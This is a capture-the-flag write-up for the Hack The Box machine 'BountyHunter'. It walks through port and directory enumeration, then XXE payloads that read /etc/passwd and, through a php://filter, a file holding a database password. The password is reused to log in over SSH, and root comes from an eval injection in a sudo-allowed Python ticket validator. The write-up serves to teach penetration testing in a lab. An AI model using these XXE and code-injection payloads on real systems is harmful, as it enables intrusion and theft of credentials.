## Default Information
IP address : 10.10.11.100\
Operating System : Linux

## Enumeration
Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports
```code 
sudo nmap -sC -sV -A -p- -T4 10.10.11.100 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open ports:
| Port Number | Service | Version |
|-----|------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
| 80	| HTTP | Apache httpd 2.4.41(Ubuntu) |

## Discovery
Using the ```wapplyzer``` plugin, we realise that the website uses ```php``` files.
![Image of wapplyzer](https://github.com/joelczk/writeups/blob/main/HTB/Images/bountyhunter_wapplyzer.PNG)

Afterwards, we run directory enumeration on the web service of the IP address. From the output, we notice an interesting file ```db.php```
* dir : Specifies dir/file enumeration mode
* -u : Specifies the URL 
* -w : Specifies the wordlist
* -x : specifies the file extension
* -z : Do not display progress information
```code
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -z
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/08/08 21:09:43 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]   
/portal.php           (Status: 200) [Size: 125]                                     
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]      
/db.php               (Status: 200) [Size: 0]                                       
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]       
                                    
```
We realise that ```/js```, ```/css``` and ```/assets``` returns a status code of 403, but ```/resources``` returns a status code of 200. Visiting ```/resources```, we can see the following from the website:

![Resources page](https://github.com/joelczk/writeups/blob/main/HTB/Images/bountyhunter_resources.PNG)

We find an interesting file ```bountylog.js``` from the resources page. Upon viewing the script, we can find another php file, ```tracker_diRbPr00f314.php```
```code
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

We are also able to find a ```/log_submit.php``` page. This page contains a form that can be submitted.We will then try to send a POST request to the backend, and intercept it 
with Burp. We also realise that the POST request is being sent to ```/tracker_diRbPr00f314.php```

![/tracker_diRbPr00f314.php request](https://github.com/joelczk/writeups/blob/main/HTB/Images/bountyhunter_tracker.PNG)

Looking at the ```data``` field in the request, we realize that there are URL encoded characters in the ```data``` field. Hence, we will first URL decode the payyload before we decode it with base64.
```code
┌──(kali㉿kali)-[~]
└─$ echo PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPnRlc3Q8L2N3ZT4KCQk8Y3Zzcz50ZXN0PC9jdnNzPgoJCTxyZXdhcmQ+dGVzdDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg== | base64 --decode
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>test</title>
                <cwe>test</cwe>
                <cvss>test</cvss>
                <reward>test</reward>
                </bugreport>   
```

The payload shows an XXE entity, and so we will try to change the payload to do XML injection on the payload. (NOTE: we will still have to URL encode and base64 encode the payload)
```code
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>  
```
The response that we have received shows the ```/etc/passwd``` file, and we notice that there is a user called ```development``` that might not require a password. Hence we will try to ssh with the user
```code
HTTP/1.1 200 OK
Date: Mon, 09 Aug 2021 02:34:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2102
Connection: close
Content-Type: text/html; charset=UTF-8
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>test</td>
  </tr>
</table>
```
Unfortunately, we do not know the password of the ```development``` user to login to the SSH server
```code
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh development@10.10.11.100                                         3 ⚙
development@10.10.11.100's password: 
Permission denied, please try again.
development@10.10.11.100's password: 
Permission denied, please try again.
development@10.10.11.100's password: 
development@10.10.11.100: Permission denied (publickey,password).
```
However, we recall from ```gobuster``` that we have a ```db.php``` file, and the likely location that the file is stored in is ```var/www/html/db.php```. We can modify
the payload to read from the ```db.php``` file
```code
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport> 
  
 ```
 The response for the payload gives us a base-64 encoded text that decodes to provide password for the database server
 ```code
 ┌──(kali㉿kali)-[~/Desktop]
└─$ echo PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo= | base64 --decode
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

## Obtaining User flag
We will now SSH into the database server, using the ```development``` username that we have found earlier, and we finally successfully logged into the server via SSH. We will then be able to obtain the user flag for this challenge
```code
sh development@10.10.11.100                                         5 ⚙
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 09 Aug 2021 03:15:58 AM UTC

  System load:           0.0
  Usage of /:            24.1% of 6.83GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             217
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9e4b


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$
development@bountyhunter:~$ cat user.txt
```

## Obtaining System flag
Next, we need to find program that have root permissions and we discovered that ```/opt/skytrain_inc/ticketValidator.py``` has root permissions
```code
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
We also realize that we are unable to modify the python script as ```/usr/bin/nano``` and ```/usr/bin/vi``` are not given root privileges.
```code
development@bountyhunter:~$ sudo nano /opt/skytrain_inc/ticketValidator.py
[sudo] password for development: 
Sorry, user development is not allowed to execute '/usr/bin/nano /opt/skytrain_inc/ticketValidator.py' as root on bountyhunter.
development@bountyhunter:~$ sudo vi /opt/skytrain_inc/ticketValidator.py
[sudo] password for development: 
Sorry, user development is not allowed to execute '/usr/bin/vi /opt/skytrain_inc/ticketValidator.py' as root on bountyhunter.
```
### Code Analysis of ticketValidator.py
This section of code tells us that this code only loads a file if it is a file of ```md``` format.
```code
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
```
This section of the code tells us that the first line in the markdown file must contain ```# Skytrain Inc```
```code
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
```
This section of the code tells us that the second line in the markdown file must contain ```## Ticket to ```
```code
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue
```
This section of the code tells us that the next line must begin with ```__Ticket Code:__```, and ```code_line``` will increment. This line is essential so that the next section of the code below will be executed
```code
        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue
```
There are 3 things happening on the last section of the code. Firstly, the fourth line of the markdown file must begin with ```**```. Secondly, the ```**``` will be replaced and the rest of the line will be evaluated.
Thirdly, the ```validationNumber``` must be evaluated to be greater than 100 to be ```true```
```code
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
```
### Exploit
We notice that the input passed to the ```eval``` function is not properly sanitized, and so we can pass in a python code command and allow it to be executed. This crafted markdown payload will be able to obtain the system flag with root privileges.
```code
development@bountyhunter:~$ cat exploit.md
# Skytrain Inc
## Ticket to exploit
__Ticket Code:__
** 102 + 310 == 412 and __import__('os').system('sudo cat /root/root.txt') == False
```
Executing ```ticketValidator.py``` and passing in the exploit file will allow us to obtain the system flag
```code
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
exploit.md
Destination: exploit
<Redacted system flag>
Invalid ticket.
```
